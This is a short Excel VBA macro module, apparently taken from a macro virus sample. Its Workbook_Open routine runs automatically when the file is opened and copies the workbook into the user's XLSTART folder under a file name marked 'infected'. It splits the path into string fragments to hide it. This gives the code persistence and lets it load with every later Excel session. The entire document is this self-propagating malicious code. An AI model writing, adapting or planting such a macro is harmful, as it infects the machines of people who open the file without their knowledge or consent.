Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim dst As String
    dst = Environ("APPDATA") & "\Micr" & "osoft\Ex" & "cel\XL" & "START\" & "oblivio" & "nx_infect" & "ed.xls" & "m"
    ThisWorkbook.SaveCopyAs dst
End Sub
